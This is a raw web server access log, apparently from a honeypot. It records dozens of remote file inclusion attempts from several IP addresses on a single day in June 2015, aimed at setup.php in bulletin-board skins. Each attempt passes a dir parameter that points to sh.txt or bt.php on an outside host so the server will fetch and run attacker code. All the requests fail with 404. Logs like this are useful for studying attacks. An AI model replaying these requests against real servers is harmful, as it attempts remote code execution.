180.179.212.214 - - [28/Jun/2015:17:48:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:20 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:20 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:20 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:21 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:22 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:22 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:22 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
212.48.75.159 - - [28/Jun/2015:17:48:22 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
180.179.212.214 - - [28/Jun/2015:17:48:23 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:23 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:24 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
212.48.75.159 - - [28/Jun/2015:17:48:24 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.48.75.159 - - [28/Jun/2015:17:48:24 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
180.179.212.214 - - [28/Jun/2015:17:48:24 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:25 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
212.48.75.159 - - [28/Jun/2015:17:48:25 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.48.75.159 - - [28/Jun/2015:17:48:25 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
180.179.212.214 - - [28/Jun/2015:17:48:25 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:25 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:26 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
212.48.75.159 - - [28/Jun/2015:17:48:26 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.48.75.159 - - [28/Jun/2015:17:48:27 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
180.179.212.214 - - [28/Jun/2015:17:48:27 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:27 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
180.179.212.214 - - [28/Jun/2015:17:48:27 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
212.48.75.159 - - [28/Jun/2015:17:48:28 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.48.75.159 - - [28/Jun/2015:17:48:28 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
180.179.212.214 - - [28/Jun/2015:17:48:29 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
212.48.75.159 - - [28/Jun/2015:17:48:29 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.48.75.159 - - [28/Jun/2015:17:48:29 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
212.48.75.159 - - [28/Jun/2015:17:48:30 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
180.179.212.237 - - [28/Jun/2015:17:48:46 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:48:47 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:48:49 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:48:53 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:48:54 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:48:55 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:48:56 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:00 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:02 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:06 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:07 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:08 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:09 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:10 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:11 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:12 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:12 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:14 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:19 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:22 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:23 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:24 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:24 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:26 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:26 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:49:26 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:26 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:26 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:28 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:28 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:28 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:28 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:30 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:30 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:30 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:30 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:32 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:32 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:32 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:32 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:34 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:49:34 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:34 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:36 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:49:41 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:42 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:43 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:44 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:45 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:46 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:47 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:48 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:49 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:50 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:51 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:49:52 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
74.208.16.118 - - [28/Jun/2015:17:50:45 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:50:46 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:50:46 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:50:48 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.180.80 - - [28/Jun/2015:17:51:02 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:17:51:03 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:17:51:03 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:17:51:04 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.16.118 - - [28/Jun/2015:17:51:05 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:51:07 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:51:08 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:51:09 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
